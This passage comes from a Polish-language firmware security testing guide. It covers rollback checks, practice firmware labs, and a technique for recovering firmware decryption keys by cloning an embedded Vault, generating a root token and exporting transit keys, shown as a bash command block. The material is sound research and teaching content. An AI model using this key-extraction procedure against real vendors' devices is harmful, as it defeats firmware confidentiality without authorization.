* Czy przepływy aktualizacji *częściowych* lub *z kopii zapasowej* ponownie wykorzystują tę samą logikę weryfikacji?

> 💡  Jeśli brakuje któregokolwiek z powyższych elementów, platforma jest prawdopodobnie podatna na ataki rollback.

## Podatne firmware do ćwiczeń

Aby ćwiczyć wykrywanie podatności w firmware, zacznij od poniższych projektów z podatnym firmware.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Odzyskiwanie kluczy deszyfrujących firmware ze stanu wbudowanego KMS/Vault

Gdy obraz aktualizacji zawiera niewielkie metadane w postaci jawnej oraz duży blob o wysokiej entropii, przed próbami brute-force przeanalizuj zawartość kontenera:<sup>[[1]](#references)</sup>

- Zrzucić nagłówki, offsety i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` zwykle oznacza format OpenSSL `enc`: następne 8 bajtów to sól, a pozostałe bajty to szyfrogram.
- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, mocno sugeruje, że to szyfrogram RSA-2048 zawierający losowe hasło/sesyjny klucz firmware.
- Dołączony do tego samego pliku materiał PGP często służy wyłącznie do ochrony autentyczności; nie zakładaj, że odpowiada za poufność.

Jeśli statyczne wyszukiwanie kluczy (`grep`, `strings`, wyszukiwanie PEM/PGP) nie przynosi rezultatów, prześledź **operacyjną ścieżkę deszyfrowania** zamiast szukać wyłącznie kluczy prywatnych:

- Zdekompiluj updater / plik binarny do zarządzania urządzeniem i prześledź, kto odczytuje zaszyfrowany blob, która funkcja pomocnicza/API go odszyfrowuje oraz jakiej logicznej nazwy klucza żąda.
- Przeszukaj wyodrębniony root filesystem pod kątem stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), a także plików jednostek i skryptów init.
- Traktuj polecenia w postaci jawnej, takie jak `vault operator unseal ...`, klucze recovery, tokeny bootstrap lub lokalne skrypty automatycznego odpieczętowywania KMS, jak materiał równoważny kluczom prywatnym.

Jeśli urządzenie zawiera oryginalny plik binarny Vault i backend pamięci masowej, odtworzenie tego środowiska jest zwykle łatwiejsze niż ponowna implementacja wewnętrznych mechanizmów Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Z uprawnieniami root w sklonowanym KMS:

- Ustaw klucze transit jako eksportowalne wyłącznie w izolowanym klonie: `vault write transit/keys/<name>/config exportable=true`
- Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
- Wypróbuj odzyskany klucz RSA z dokładną parą paddingu i hashy używaną przez KMS. Nieudane odszyfrowanie PKCS#1 v1.5 i nieudane domyślne odszyfrowanie OAEP **nie** dowodzą, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie używają SHA-1.
- Jeśli payload zaczyna się od `Salted__`, odtwórz dokładnie KDF OpenSSL dostawcy (`EVP_BytesToKey`, często MD5 w starszych urządzeniach) przed próbą odszyfrowania AES-CBC.

Dzięki temu „zaszyfrowane firmware” staje się bardziej ogólnym problemem: **odzyskaj klucze operacyjne po stronie urządzenia, a następnie odtwórz dokładne parametry unwrap i KDF offline**.

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware with Claude: Umiejętności na poziomie seniora, autonomia na poziomie juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia testowania bezpieczeństwa firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktyczny hacking IoT: Kompletny przewodnik po atakowaniu Internetu rzeczy](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Wykorzystywanie zero-dayów w porzuconym sprzęcie – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jak inteligentne urządzenie za 20 USD zapewniło mi dostęp do Twojego domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Teraz widzisz mi: teraz jesteś Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Wykorzystywanie Tesla Wall Connector przez złącze portu ładowania - Część 2: obejście zabezpieczenia przed downgrade’em](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Niech zacznie migać: zdalne wykorzystywanie Philips Hue Bridge przez sieć bezprzewodową](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
